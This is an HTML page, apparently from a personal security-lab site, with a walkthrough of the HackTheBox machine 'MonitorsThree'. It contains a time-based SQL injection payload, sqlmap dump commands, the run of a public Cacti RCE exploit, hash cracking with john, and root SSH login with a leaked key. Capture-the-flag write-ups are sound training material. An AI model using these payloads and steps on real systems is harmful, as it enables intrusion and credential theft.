@@ -1,0 +1,266 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - MonitorsThree</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>MonitorsThree (HTB – Medium)</h1>
+
+<p>
+The machine hosts a Cacti monitoring instance on a hidden subdomain.  
+A time‑based SQL injection on the main site reveals valid credentials, allowing login to Cacti.  
+Cacti 1.2.26 is vulnerable to authenticated RCE (CVE‑2024‑25641).  
+Privilege escalation is achieved by discovering that the SSH private key for <code>marcus</code> actually belongs to <code>root</code>.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: monitorsthree.htb  
+<br>Initial vector: SQL injection → admin credentials  
+<br>Privilege escalation: leaked root SSH key  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>
+Initial enumeration of <code>monitorsthree.htb</code> reveals nothing useful.  
+Directory fuzzing shows only static assets.
+</p>
+
+<p>Virtual host fuzzing:</p>
+<pre>
+$ ffuf -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" \
+  -w directory-list-2.3-medium.txt -fs 13560
+-> cacti.monitorsthree.htb
+</pre>
+
+<p>
+Add the subdomain to <code>/etc/hosts</code> and browse it:
+</p>
+
+<pre>
+http://cacti.monitorsthree.htb
+-> Cacti 1.2.26
+</pre>
+
+<p>
+Cacti 1.2.26 is known to be vulnerable to authenticated RCE (CVE‑2024‑25641), but credentials are needed first.
+</p>
+
+<h2>SQL Injection – Main Site</h2>
+
+<p>
+The main site contains a password reset form:
+</p>
+
+<pre>
+http://monitorsthree.htb/forgot_password.php
+</pre>
+
+<p>
+Testing with a single quote reveals SQL injection.  
+A time‑based payload confirms it:
+</p>
+
+<pre>
+username=admin' AND IF(SUBSTRING(database(),13,1)='e',SLEEP(2),NULL)-- -
+</pre>
+
+<p>
+Use sqlmap to automate extraction:
+</p>
+
+<pre>
+$ sqlmap -r req_2.txt --batch --dbs
+$ sqlmap -r req_2.txt -D monitorsthree_db --tables
+$ sqlmap -r req_2.txt -T users --dump
+</pre>
+
+<p>
+Recovered credentials:
+</p>
+
+<pre>
+admin : greencacti2001
+</pre>
+
+<p>
+These work on both the main site and the Cacti panel.
+</p>
+
+<h2>Foothold – Cacti 1.2.26 RCE</h2>
+
+<p>
+Use a public exploit:
+</p>
+
+<pre>
+https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26
+</pre>
+
+<p>Run it:</p>
+<pre>
+$ python3 exploit.py -u admin -p greencacti2001
+</pre>
+
+<p>
+A shell is obtained as the web user.
+</p>
+
+<h2>Database Enumeration</h2>
+
+<p>
+Cacti database credentials are stored in the application directory:
+</p>
+
+<pre>
+cactiuser : cactiuser
+</pre>
+
+<p>
+Connect to MariaDB:
+</p>
+
+<pre>
+MariaDB [cacti]> select * from user_auth;
+</pre>
+
+<p>
+Relevant entry:
+</p>
+
+<pre>
+marcus : $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
+</pre>
+
+<p>
+Crack it:
+</p>
+
+<pre>
+$ john hash.txt -w /usr/share/wordlists/rockyou.txt
+-> 12345678910
+</pre>
+
+<p>
+Switch user:
+</p>
+
+<pre>
+$ su marcus
+</pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+Inside <code>/home/marcus</code> is an SSH private key:
+</p>
+
+<pre>
+id_rsa
+</pre>
+
+<p>
+However, the key does not belong to marcus — it belongs to root.  
+Copy it to the attacker machine and set permissions:
+</p>
+
+<pre>
+$ chmod 600 id_rsa
+$ ssh -i id_rsa root@monitorsthree.htb
+</pre>
+
+<p>
+Root access obtained.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+MonitorsThree combines a simple time‑based SQL injection with an authenticated Cacti RCE.  
+After dumping database credentials and exploiting Cacti, the final privilege escalation is achieved by discovering
+that the SSH private key in marcus’s home directory actually belongs to root.  
+This provides immediate full system compromise.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
